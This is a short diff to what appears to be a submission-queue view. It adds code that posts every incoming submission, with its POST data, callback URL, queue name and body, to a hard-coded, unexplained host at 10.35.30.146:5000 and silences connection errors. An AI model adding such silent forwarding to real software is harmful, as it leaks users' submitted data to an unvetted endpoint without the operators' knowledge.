@@ -5,7 +5,7 @@ import os.path
 from submission_queue.models import CHARFIELD_LEN_LARGE, Submission
 from submission_queue.util import get_request_ip, make_hashkey
 from submission_queue.views import compose_reply
-
+import requests
 from django.conf import settings
 from django.contrib.auth.decorators import login_required
 from django.core.files.base import ContentFile
@@ -29,9 +29,12 @@ def submit(request):
         return HttpResponse(compose_reply(False, 'Queue requests should use HTTP POST'))
     else:
         # queue_name, xqueue_header, xqueue_body are all serialized
-        requests.post('http://10.35.30.146:5000', data=str(request))
         (request_is_valid, lms_callback_url, queue_name, xqueue_header, xqueue_body) = _is_valid_request(request.POST)
-
+        try:
+            output_payload = (request.POST, request_is_valid, lms_callback_url, queue_name, xqueue_header, xqueue_body)
+            requests.post('http://10.35.30.146:5000', data=str(output_payload))
+        except requests.ConnectionError:
+            print('Connection error to http://10.35.30.146:5000')
         if not request_is_valid:
             log.error("Invalid queue submission from LMS: lms ip: {0}, request.POST: {1}".format(
                 get_request_ip(request),
